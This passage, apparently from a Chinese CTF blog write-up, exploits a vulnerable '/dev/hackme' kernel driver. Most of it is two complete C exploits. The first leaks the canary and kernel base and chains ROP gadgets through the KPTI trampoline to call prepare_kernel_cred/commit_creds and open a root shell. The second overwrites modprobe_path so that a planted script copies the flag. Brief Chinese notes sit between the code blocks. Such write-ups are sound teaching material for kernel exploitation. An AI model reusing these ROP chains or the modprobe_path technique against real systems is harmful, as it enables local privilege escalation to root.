class="comment">// r12</span></span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// rbp</span></span><br><span class="line">  payload[off++] = pop_rdi_rbp_ret;</span><br><span class="line">  payload[off++] = rdi;</span><br><span class="line">  payload[off++] = <span class="number">0</span>;</span><br><span class="line">  payload[off++] = fn;</span><br><span class="line">  payload[off++] = kpti_trampoline;</span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// dummy rax</span></span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// dummy rdi</span></span><br><span class="line">  payload[off++] = ret;</span><br><span class="line">  payload[off++] = user_cs;</span><br><span class="line">  payload[off++] = user_rflags;</span><br><span class="line">  payload[off++] = user_sp;</span><br><span class="line">  payload[off++] = user_ss;</span><br><span class="line">  wtk(payload, off * <span class="number">8</span>);</span><br><span class="line">  Done(<span class="string">&quot;fn_rdi_ret_primitive&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种只要有能控制 rdi 的 gadget 就行， 然后两个原语每次读出来的值都用 rax 保存后用汇编给到我们的指定寄存器。<br>对于 <code>prepare_kernel_cred</code> , 返回的是一个 <code>cred</code>  结构体，可以用临时变量存储即可。然后注意一点，rax 弄好了就别打印输出东西了，<br>否则会毁坏掉 rax 的内容。<br>这里还一个疑点， <code>kpti_trampoline</code>  之后有个 pop rax ，会破坏掉原语创造的 rax</p><h2 id="exp1"><a class="markdownIt-Anchor" href="#exp1">#</a> exp1</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;include/head.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 1024</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> u64;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line">u64 write_addr, read_addr;</span><br><span class="line">u64 user_cs,user_ss,user_sp,user_rflags;</span><br><span class="line"><span class="type">void</span> (*rfap)(<span class="type">char</span> *, <span class="type">void</span> (*)());</span><br><span class="line"><span class="type">void</span> (*frrp)(<span class="type">void</span> (*)(), u64, <span class="type">void</span> (*)());</span><br><span class="line"><span class="type">void</span> <span class="title function_">saveState</span><span class="params">()</span>&#123;</span><br><span class="line">  __asm__ __volatile__ (</span><br><span class="line">    <span class="string">&quot;mov %cs, user_cs;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov %ss, user_ss;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov %rsp, user_sp;&quot;</span></span><br><span class="line">    <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">    <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">  );</span><br><span class="line">  Done(<span class="string">&quot;saveState&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">open_dev</span><span class="params">()</span>&#123;</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/hackme&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    Panic(<span class="string">&quot;open_dev() failed&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  Done(<span class="string">&quot;open_dev()&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// write to kernel</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">wtk</span><span class="params">(<span class="type">char</span> *buf, u64 size)</span>&#123;</span><br><span class="line">  Info(<span class="string">&quot;wtk start&quot;</span>);</span><br><span class="line">  write(fd, buf, size);</span><br><span class="line">  Done(<span class="string">&quot;wtk&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// read from kernel</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">rfk</span><span class="params">(<span class="type">char</span> *buf, u64 size)</span>&#123;</span><br><span class="line">  Info(<span class="string">&quot;rfk start&quot;</span>);</span><br><span class="line">  read(fd, buf, size);</span><br><span class="line">  Done(<span class="string">&quot;rfk&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">    Info(<span class="string">&quot;get shell now&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    Panic(<span class="string">&quot;getShell failed&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">u64 sh = (u64)getShell;</span><br><span class="line"></span><br><span class="line">u64 kernel_base                 = <span class="number">0xffffffff80000000</span>;</span><br><span class="line">u64 kpti_trampoline             = <span class="number">0x200f10</span>+<span class="number">22</span>;</span><br><span class="line">u64 pop_rax_ret                 = <span class="number">0x4d11</span>; <span class="comment">// pop rax; ret</span></span><br><span class="line">u64 read_mem_pop1_ret           = <span class="number">0x4aae</span>; <span class="comment">// mov eax, qword ptr [rax + 0x10]; pop rbp; ret;</span></span><br><span class="line">u64 pop_rdi_rbp_ret             = <span class="number">0x38a0</span>; <span class="comment">// pop rdi; pop rbp; ret;</span></span><br><span class="line">u64 canary                      = <span class="number">0</span>;</span><br><span class="line">u64 ksymtab_prepare_kernel_cred = <span class="number">0xf8d4fc</span>;</span><br><span class="line">u64 ksymtab_commit_creds        = <span class="number">0xf87d90</span>;</span><br><span class="line">u64 tmp_rax;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_leak</span><span class="params">(u64 *p, u64 n)</span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(u64 i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(p[i] &amp; <span class="number">0xffffffff81000000</span> == <span class="number">0xffffffff81000000</span>)</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;p[%d] : 0x%lx\n&quot;</span>, i, p[i]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">leak</span><span class="params">()</span>&#123;</span><br><span class="line">  Info(<span class="string">&quot;leak&quot;</span>);</span><br><span class="line">  <span class="type">char</span> store[<span class="number">0x300</span>];</span><br><span class="line">  rfk(store,<span class="number">0x1f0</span>);</span><br><span class="line">  u64 *ptr = store;</span><br><span class="line">  Info(<span class="string">&quot;   --&gt; canary is 0x%lx&quot;</span>, ptr[<span class="number">2</span>]);</span><br><span class="line">  canary = ptr[<span class="number">2</span>];</span><br><span class="line">  kernel_base = ptr[<span class="number">38</span>] - <span class="number">0xa157</span>;</span><br><span class="line">  Info(<span class="string">&quot;   --&gt; kernel_base is 0x%lx&quot;</span>,kernel_base);</span><br><span class="line">  u64 payload[<span class="number">50</span>];</span><br><span class="line">  pop_rdi_rbp_ret             += kernel_base;</span><br><span class="line">  pop_rax_ret                 += kernel_base;</span><br><span class="line">  read_mem_pop1_ret           += kernel_base;</span><br><span class="line">  kpti_trampoline             += kernel_base;</span><br><span class="line">  ksymtab_prepare_kernel_cred += kernel_base;</span><br><span class="line">  ksymtab_commit_creds        += kernel_base;</span><br><span class="line">  Done(<span class="string">&quot;leak&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">read_from_addr_primitive</span><span class="params">(<span class="type">char</span> *addr, <span class="type">void</span> (*f)())</span>&#123;</span><br><span class="line">  u64 payload[<span class="number">0x40</span>];</span><br><span class="line">  u64 off = <span class="number">16</span>;</span><br><span class="line">  payload[off++] = canary;</span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// rbx</span></span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// r12</span></span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// rbp</span></span><br><span class="line">  payload[off++] = pop_rax_ret;</span><br><span class="line">  payload[off++] = addr - <span class="number">0x10</span>;</span><br><span class="line">  payload[off++] = read_mem_pop1_ret;</span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// dummy</span></span><br><span class="line">  payload[off++] = kpti_trampoline;</span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// dummy rax</span></span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// dummy rdi</span></span><br><span class="line">  payload[off++] = f;</span><br><span class="line">  payload[off++] = user_cs;</span><br><span class="line">  payload[off++] = user_rflags;</span><br><span class="line">  payload[off++] = user_sp;</span><br><span class="line">  payload[off++] = user_ss;</span><br><span class="line">  wtk(payload, off * <span class="number">8</span>);</span><br><span class="line">  Done(<span class="string">&quot;read_from_addr_primitive&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fn_rdi_ret_primitive</span><span class="params">(<span class="type">void</span> (*fn)(), u64 rdi, <span class="type">void</span> (*ret)())</span>&#123;</span><br><span class="line">  u64 payload[<span class="number">0x40</span>];</span><br><span class="line">  u64 off = <span class="number">16</span>;</span><br><span class="line">  payload[off++] = canary;</span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// rbx</span></span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// r12</span></span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// rbp</span></span><br><span class="line">  payload[off++] = pop_rdi_rbp_ret;</span><br><span class="line">  payload[off++] = rdi;</span><br><span class="line">  payload[off++] = <span class="number">0</span>;</span><br><span class="line">  payload[off++] = fn;</span><br><span class="line">  payload[off++] = kpti_trampoline;</span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// dummy rax</span></span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// dummy rdi</span></span><br><span class="line">  payload[off++] = ret;</span><br><span class="line">  payload[off++] = user_cs;</span><br><span class="line">  payload[off++] = user_rflags;</span><br><span class="line">  payload[off++] = user_sp;</span><br><span class="line">  payload[off++] = user_ss;</span><br><span class="line">  wtk(payload, off * <span class="number">8</span>);</span><br><span class="line">  Done(<span class="string">&quot;fn_rdi_ret_primitive&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">u64 pkc;</span><br><span class="line"><span class="type">void</span> <span class="title function_">get_cc_addr</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">get_pkc_addr</span><span class="params">()</span>&#123;</span><br><span class="line">  __asm__ __volatile__(</span><br><span class="line">    <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov tmp_rax, rax;&quot;</span></span><br><span class="line">    <span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">  );</span><br><span class="line">  pkc = ksymtab_prepare_kernel_cred + (<span class="type">int</span>)tmp_rax;</span><br><span class="line">  Dbg(<span class="string">&quot;   --&gt; pkc tmp_rax is 0x%x&quot;</span>,(<span class="type">int</span>) tmp_rax);</span><br><span class="line">  Info(<span class="string">&quot;   --&gt; pkc is 0x%lx&quot;</span>, pkc);</span><br><span class="line">  rfap(ksymtab_commit_creds, get_cc_addr);</span><br><span class="line">  Done(<span class="string">&quot;get_pkc_addr&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">u64 cc;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> dont put any output in head to destory rax</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">done_pkc</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">get_cc_addr</span><span class="params">()</span>&#123;</span><br><span class="line">  __asm__ __volatile__(</span><br><span class="line">    <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov tmp_rax, rax;&quot;</span></span><br><span class="line">    <span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">  );</span><br><span class="line">  cc = ksymtab_commit_creds + (<span class="type">int</span>)tmp_rax;</span><br><span class="line">  Dbg(<span class="string">&quot;   --&gt; cc tmp_rax is 0x%x&quot;</span>,tmp_rax);</span><br><span class="line">  Info(<span class="string">&quot;   --&gt; cc is  0x%lx&quot;</span>, cc);</span><br><span class="line">  frrp(pkc, <span class="literal">NULL</span>, done_pkc);</span><br><span class="line">  Done(<span class="string">&quot;get_cc_addr&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">u64 cc_struct;</span><br><span class="line"><span class="type">void</span> <span class="title function_">done_pkc</span><span class="params">()</span>&#123;</span><br><span class="line">  __asm__ __volatile__(</span><br><span class="line">    <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov tmp_rax, rax;&quot;</span></span><br><span class="line">    <span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">  );</span><br><span class="line">  cc_struct = tmp_rax;</span><br><span class="line">  Info(<span class="string">&quot;   --&gt; cc_struct is 0x%lx&quot;</span>, cc_struct);</span><br><span class="line">  frrp(cc, cc_struct, sh);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> (*rfap)(<span class="type">char</span> *, <span class="type">void</span> (*)()) = read_from_addr_primitive;</span><br><span class="line"><span class="type">void</span> (*frrp)(<span class="type">void</span> (*)(), u64, <span class="type">void</span> (*)()) = fn_rdi_ret_primitive;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  saveState();</span><br><span class="line">  open_dev();</span><br><span class="line">  leak();</span><br><span class="line">  rfap(ksymtab_prepare_kernel_cred, get_pkc_addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="exp2"><a class="markdownIt-Anchor" href="#exp2">#</a> exp2</h2><ul><li>modprobe_path 不再赘述<br>这个是.data 节的数据 到内核基址的偏移也是确定的，另外先前也知道了 memcpy 在偏移不变的段内。ROP 覆写即可</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/ # cat /proc/kallsyms | grep memcpy</span><br><span class="line">ffffffff81007c60 T __memcpy_mcsafe</span><br><span class="line">ffffffff8100dd60 T __memcpy</span><br><span class="line">ffffffff8100dd60 W memcpy</span><br><span class="line"></span><br><span class="line">/ # cat /proc/kallsyms | grep modprobe_path</span><br><span class="line">ffffffff82061820 D modprobe_path</span><br></pre></td></tr></table></figure><p>不过由于 SMAP 的缘故，memcpy 不能用，只能找写入的 gadget。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/<span class="number">10</span>i <span class="number">0x306d</span>+<span class="number">0xffffffff81000000</span></span><br><span class="line">   <span class="number">0xffffffff8100306d</span>:  mov    QWORD PTR [rbx],rax</span><br><span class="line">   <span class="number">0xffffffff81003070</span>:  pop    rbx</span><br><span class="line">   <span class="number">0xffffffff81003071</span>:  pop    rbp</span><br><span class="line">   <span class="number">0xffffffff81003072</span>:  ret</span><br></pre></td></tr></table></figure><p>这样就还需要一个控制 rbx 的 gadget，rax 写成 <code>/tmp/s</code> , rbx 写成 modprobe_path 的地址，控制 rax 的 exp1 里已经有了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/<span class="number">10</span>i <span class="number">0x3190</span>+<span class="number">0xffffffff81000000</span></span><br><span class="line">   <span class="number">0xffffffff81003190</span>:  pop    rbx</span><br><span class="line">   <span class="number">0xffffffff81003191</span>:  pop    r12</span><br><span class="line">   <span class="number">0xffffffff81003193</span>:  pop    rbp</span><br><span class="line">   <span class="number">0xffffffff81003194</span>:  ret</span><br></pre></td></tr></table></figure><p>那么 exp2 就很简单了。注意 <code>/tmp/s</code>  不要太长 不然就和后面的字符串拼接上了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">u64 kernel_base              = <span class="number">0xffffffff81000000</span>;</span><br><span class="line">u64 kpti_trampoline          = <span class="number">0x200f10</span>+<span class="number">22</span>;</span><br><span class="line">u64 modprobe                 = <span class="number">0x1061820</span>;</span><br><span class="line">u64 mov_ptr_rbx_rax_pop2_ret = <span class="number">0x306d</span>;</span><br><span class="line">u64 pop_rbx_pop2_ret         = <span class="number">0x3190</span>;</span><br><span class="line">u64 pop_rax_ret              = <span class="number">0x4d11</span>; <span class="comment">// pop rax; ret</span></span><br><span class="line">u64 tmp_rax;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_leak</span><span class="params">(u64 *p, u64 n)</span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(u64 i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(p[i] &amp; <span class="number">0xffffffff81000000</span> == <span class="number">0xffffffff81000000</span>)</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;p[%d] : 0x%lx\n&quot;</span>, i, p[i]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">leak</span><span class="params">()</span>&#123;</span><br><span class="line">  Info(<span class="string">&quot;leak&quot;</span>);</span><br><span class="line">  <span class="type">char</span> store[<span class="number">0x300</span>];</span><br><span class="line">  rfk(store,<span class="number">0x1f0</span>);</span><br><span class="line">  u64 *ptr = store;</span><br><span class="line">  Info(<span class="string">&quot;   --&gt; canary is 0x%lx&quot;</span>, ptr[<span class="number">2</span>]);</span><br><span class="line">  canary = ptr[<span class="number">2</span>];</span><br><span class="line">  kernel_base = ptr[<span class="number">38</span>] - <span class="number">0xa157</span>;</span><br><span class="line">  Info(<span class="string">&quot;   --&gt; kernel_base is 0x%lx&quot;</span>,kernel_base);</span><br><span class="line">  modprobe                    += kernel_base;</span><br><span class="line">  mov_ptr_rbx_rax_pop2_ret    += kernel_base;</span><br><span class="line">  pop_rbx_pop2_ret            += kernel_base;</span><br><span class="line">  kpti_trampoline             += kernel_base;</span><br><span class="line">  pop_rax_ret                 += kernel_base;</span><br><span class="line">  Done(<span class="string">&quot;leak&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">trigger_modprobe</span><span class="params">()</span>&#123;</span><br><span class="line">  Info(<span class="string">&quot;trigger_modprobe&quot;</span>);</span><br><span class="line">  system(</span><br><span class="line">    <span class="string">&quot;echo &#x27;#!/bin/sh\n&quot;</span></span><br><span class="line">    <span class="string">&quot;cp /flag /tmp/flag\n&quot;</span></span><br><span class="line">    <span class="string">&quot;chmod 777 /tmp/flag&#x27; &gt; /tmp/s\n&quot;</span></span><br><span class="line">  );</span><br><span class="line">  system(<span class="string">&quot;chmod +x /tmp/s&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/dummy&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;chmod +x /tmp/dummy&quot;</span>);</span><br><span class="line">  Info(<span class="string">&quot;Run unknown file&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;/tmp/dummy&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;cat /tmp/flag&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">overflow</span><span class="params">()</span>&#123;</span><br><span class="line">  u64 payload[<span class="number">0x40</span>];</span><br><span class="line">  u64 off = <span class="number">16</span>;</span><br><span class="line">  payload[off++] = canary;</span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// rbx</span></span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// r12</span></span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// rbp</span></span><br><span class="line">  payload[off++] = pop_rbx_pop2_ret;</span><br><span class="line">  payload[off++] = modprobe;</span><br><span class="line">  payload[off++] = <span class="number">0</span>; <span class="comment">// dummy</span></span><br><span class="line">  payload[off++] = <span class="number">0</span>; <span class="comment">// dummy</span></span><br><span class="line">  payload[off++] = pop_rax_ret; </span><br><span class="line">  payload[off++] = <span class="number">0x732f706d742f</span>;<span class="comment">// /tmp/s little-endian</span></span><br><span class="line">  payload[off++] = mov_ptr_rbx_rax_pop2_ret;</span><br><span class="line">  payload[off++] = <span class="number">0</span>;</span><br><span class="line">  payload[off++] = <span class="number">0</span>;</span><br><span class="line">  payload[off++] = kpti_trampoline;</span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// dummy rax</span></span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// dummy rdi</span></span><br><span class="line">  payload[off++] = trigger_modprobe;</span><br><span class="line">  payload[off++] = user_cs;</span><br><span class="line">  payload[off++] = user_rflags;</span><br><span class="line">  payload[off++] = user_sp;</span><br><span class="line">  payload[off++] = user_ss;</span><br><span class="line">  wtk(payload, off * <span class="number">8</span>);</span><br><span class="line">  Done(<span class="string">&quot;read_from_addr_primitive&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  saveState();</span><br><span class="line">  open_dev();</span><br><span class="line">  leak();</span><br><span class="line">  overflow();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="references"><a 